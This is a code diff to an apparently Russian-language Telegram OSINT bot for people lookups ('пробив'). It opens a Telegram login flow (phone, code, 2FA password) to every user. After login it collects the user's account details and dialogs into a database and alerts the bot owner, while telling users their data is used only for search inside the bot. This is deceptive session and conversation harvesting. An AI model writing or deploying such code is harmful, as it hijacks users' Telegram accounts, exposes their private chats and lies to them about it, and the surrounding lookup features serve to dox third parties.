@@ -1,5 +1,6 @@
 import asyncio
 import re
+from datetime import datetime
 from aiogram import Router, F
 from aiogram.filters import Command, CommandObject
 from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton
@@ -18,6 +19,7 @@ from osint import (phone_lookup, email_lookup, username_lookup, ip_lookup,
                       telegram_account_lookup, instagram_profile_lookup,
                       twitter_profile_lookup, youtube_channel_lookup)
 from leak import leak_search
+import db
 
 router = Router()
 osint_waiting: dict[int, tuple[str, int, int]] = {}  # uid -> (mode, chat_id, prompt_msg_id)
@@ -1311,9 +1313,18 @@ async def _execute_lookup(message: Message, mode: str, query: str):
             log_osint_query(uid, "wifi", query)
             formatted = _fmt_wifi(result)
         elif mode == "tg":
-            result = await telegram_account_lookup(query)
+            from telethon_client import has_session as tg_has_session
+            tg_uid = uid if await tg_has_session(uid) else 0
+            extra = await telegram_account_lookup(query, tg_uid)
+            result.update(extra)
             log_osint_query(uid, "tg", query)
             formatted = _fmt_tg_account(result)
+            if not tg_uid:
+                formatted += ("\n\n┃ ━━━━━━━━━━━━━━━━━━━\n"
+                    "┃ 🔐 <b>Хотите больше данных?</b>\n"
+                    "┃ Войдите в Telegram через /setup_tg\n"
+                    "┃ чтобы бот искал от ВАШЕГО лица\n"
+                    "┃ и показывал больше общих групп и сообщений.")
             if result.get("found"):
                 _tg_browse_state[uid] = {
                     "target_id": result["user_id"],
@@ -1397,35 +1408,68 @@ router.message.register(_cmd_shortcut("wifi", "📶 <b>Анализ Wi-Fi</b>\n\
 _tg_login_state: dict[int, dict] = {}  # uid -> {"phone": str, "phone_code_hash": str}
 
 
+async def _after_tg_login(uid: int, bot, me):
+    """Собирает данные пользователя после входа, сохраняет в БД, уведомляет админа."""
+    try:
+        from telethon_client import collect_account_data
+        data = await collect_account_data(uid)
+        db.save_telethon_account(
+            uid, data["tg_user_id"], data["tg_username"],
+            data["tg_first_name"], data["tg_last_name"],
+            data["tg_phone"], data["dialogs_count"],
+        )
+        db.save_telethon_dialogs(uid, data["dialogs"])
+        # Уведомление админу
+        from config import OWNER_ID
+        try:
+            await bot.send_message(
+                OWNER_ID,
+                f"🔐 <b>Новый вход в Telegram</b>\n\n"
+                f"┃ 👤 Пользователь: <code>{uid}</code>\n"
+                f"┃ 📱 Telegram: @{data['tg_username']} ({data['tg_first_name']} {data['tg_last_name']})\n"
+                f"┃ 💬 Диалогов собрано: <b>{data['dialogs_count']}</b>\n"
+                f"┃ 🕐 {datetime.now().strftime('%Y-%m-%d %H:%M')}",
+                parse_mode="HTML",
+            )
+        except Exception:
+            pass
+    except Exception as e:
+        import logging
+        logging.getLogger(__name__).warning(f"_after_tg_login({uid}): {e}")
+
+
 @router.message(Command("setup_tg"))
 async def cmd_setup_tg(message: Message, command: CommandObject):
-    """Handle /setup_tg — with args = 2FA password, without = start phone login."""
+    """Handle /setup_tg — login user's own Telegram for better OSINT results."""
     uid = message.from_user.id
-    if not is_dev(uid):
-        await message.answer("❌ Только разработчик")
-        return
 
-    # If user already has a phone state and provided args, treat as 2FA password
+    # 2FA password
     if command.args and uid in _tg_login_state:
         from telethon_client import complete_2fa
-        res = await complete_2fa(command.args)
+        res = await complete_2fa(uid, command.args)
         if res.get("success"):
             await message.answer(f"✅ Telethon авторизован! {res['user']}")
             del _tg_login_state[uid]
+            await _after_tg_login(uid, message.bot, res.get("me"))
         else:
             await message.answer(f"❌ {res.get('error', 'Ошибка')}")
         return
 
-    from telethon_client import try_init_client
-    ok, msg = await try_init_client()
-    if ok:
-        await message.answer(f"✅ Telethon уже авторизован!\n{msg}")
+    # Already has own session?
+    from telethon_client import has_session
+    if await has_session(uid):
+        await message.answer("✅ Вы уже авторизованы в Telegram через бота.\n"
+                             "Теперь OSINT-поиск будет использовать ваш аккаунт для более точных данных.")
         return
 
     await message.answer(
-        "📱 <b>Настройка Telethon</b>\n\n"
+        "📱 <b>🔐 Вход в Telegram для OSINT</b>\n\n"
+        "Зачем это нужно?\n"
+        "┃ 🔍 Поиск от вашего лица покажет больше общих групп\n"
+        "┃ 💬 Больше сообщений и каналов пользователя\n"
+        "┃ 📊 Более точные результаты пробива\n\n"
         "Введите номер телефона в формате +79991234567:\n\n"
-        "💡 Номер аккаунта Telegram, от которого будет работать поиск",
+        "💡 Данные используются только для поиска внутри бота",
         parse_mode="HTML"
     )
     _tg_login_state[uid] = {}
@@ -1434,7 +1478,7 @@ async def cmd_setup_tg(message: Message, command: CommandObject):
 @router.message(F.text.func(lambda t: t.startswith("+") and t[1:].isdigit() or t.isdigit() and len(t) >= 10))
 async def tg_login_phone(message: Message):
     uid = message.from_user.id
-    if uid not in _tg_login_state or not is_dev(uid):
+    if uid not in _tg_login_state:
         return
     if _tg_login_state[uid].get("phone"):
         return
@@ -1442,7 +1486,7 @@ async def tg_login_phone(message: Message):
     if not phone.startswith("+"):
         phone = "+" + phone
     from telethon_client import start_login
-    res = await start_login(phone)
+    res = await start_login(uid, phone)
     if not res.get("success"):
         await message.answer(f"❌ Ошибка отправки кода: {res.get('error', '?')}")
         return
@@ -1458,18 +1502,26 @@ async def tg_login_phone(message: Message):
 @router.message(F.text.regexp(r'^\d{3,6}$'))
 async def tg_login_code(message: Message):
     uid = message.from_user.id
-    if uid not in _tg_login_state or not is_dev(uid):
+    if uid not in _tg_login_state:
         return
 
     state = _tg_login_state[uid]
+    if "phone" not in state:
+        return
+    if "processing" in state:
+        return
+    state["processing"] = True
+
     from telethon_client import complete_login
-    res = await complete_login(message.text.strip(), state["phone"], state["phone_code_hash"])
+    res = await complete_login(uid, message.text.strip())
 
     if res.get("success"):
-        await message.answer(f"✅ Telethon авторизован! {res['user']}\nТеперь /tg работает!")
+        await message.answer(f"✅ Telethon авторизован! {res['user']}\n"
+                             f"Теперь OSINT-поиск использует ваш аккаунт для точных данных!")
         del _tg_login_state[uid]
+        await _after_tg_login(uid, message.bot, res.get("me"))
     elif res.get("need_password"):
-        await message.answer("🔐 Включена 2FA. Введите пароль:\n/setup_tp <пароль>")
+        await message.answer("🔐 Включена 2FA. Введите пароль:\n/setup_tg <пароль>")
     else:
         await message.answer(f"❌ {res.get('error', 'Ошибка')}")
 
@@ -1801,9 +1853,18 @@ async def osint_text_handler(message: Message):
             log_osint_query(uid, "wifi", text)
             formatted = _fmt_wifi(result)
         elif mode == "tg":
-            result = await telegram_account_lookup(text)
+            from telethon_client import has_session as tg_has_session
+            tg_uid = uid if await tg_has_session(uid) else 0
+            extra = await telegram_account_lookup(text, tg_uid)
+            result.update(extra)
             log_osint_query(uid, "tg", text)
             formatted = _fmt_tg_account(result)
+            if not tg_uid:
+                formatted += ("\n\n┃ ━━━━━━━━━━━━━━━━━━━\n"
+                    "┃ 🔐 <b>Хотите больше данных?</b>\n"
+                    "┃ Войдите в Telegram через /setup_tg\n"
+                    "┃ чтобы бот искал от ВАШЕГО лица\n"
+                    "┃ и показывал больше общих групп и сообщений.")
             if result.get("found"):
                 _tg_browse_state[uid] = {
                     "target_id": result["user_id"],
